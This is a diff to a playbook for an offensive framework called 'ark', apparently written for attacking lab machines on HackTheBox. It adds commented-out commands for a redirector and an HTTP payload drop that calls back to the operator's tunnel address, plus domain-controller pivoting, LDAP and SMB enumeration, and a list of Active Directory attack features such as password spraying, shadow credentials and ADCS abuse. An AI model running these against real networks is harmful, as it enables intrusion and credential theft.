@@ -47,6 +47,9 @@ Ask if missing: machine name, target IP, domain (if AD), VPN status, whether imp
 ```bash
 # VPN + C2 reachability (do this before ldap/smb/kerberos)
 ./build/ark inbound status
+# HTTP drop when SSH is filtered (HTB :22):
+# ./build/ark inbound redirector start --listen 0.0.0.0:1750 --to 127.0.0.1:8443
+# ./build/ark inbound httpdrop --callback https://<tun0>:1750 --dir /tmp/www --listen 0.0.0.0:1723
 # VPN must be up (user runs openvpn)
 ip -br a show tun0 2>/dev/null
 nmap -Pn -n -p 445,389,88,5985,5986,22,80,443 --open <TARGET_IP>
@@ -80,7 +83,7 @@ Host-side first when there is no implant / WinRM is filtered:
 
 ```bash
 # If operator cannot reach the DC, SOCKS first:
-#   ark op socks start --port 1080 && eval "$(./build/ark inbound env)"
+#   ark inbound through --probe <DC>:389 && eval "$(./build/ark inbound env)"
 ./build/ark smb shares --host <IP> --anon
 ./build/ark ldap enum --dc <IP> --domain DOM --user u --pass-file ./p --type interesting
 ./build/ark ldap dangling --dc <IP> --domain DOM --user u --pass-file ./p
@@ -118,9 +121,9 @@ Use external tools, document:
 | --- | --- | --- |
 ```
 
-Known remaining gaps: native PKINIT UnPAC (`ark kerberos pkinit` loads PFX then errors), ADCS ESC2–11, SMB/ATSVC deploy, DNS write, WSUS MITM, Windows C reverse SOCKS.
+Known remaining gaps: native PKINIT UnPAC live-DC proof, ADCS ESC2–11, SMB/ATSVC deploy, WSUS MITM, named-pipe MSSQL, Windows C reverse SOCKS live proof.
 
-Already in-framework (use these first): `ldap enum --type acl|interesting`, `ark rbcd`, `ark ad shadow auto`, AES asktgt/S4U/keylist, `ark adcs` dangling ESC1 template+req.
+Already in-framework (use these first): `ldap enum --type acl|interesting`, `ark rbcd`, `ark ad shadow auto`, AES asktgt/S4U/keylist, `ark adcs` dangling ESC1 template+req, `ark http` NTLM GET/POST, `ark dns add`, `ark ldap spray` / `enable`.
 
 ### 5. Report & cleanup
 
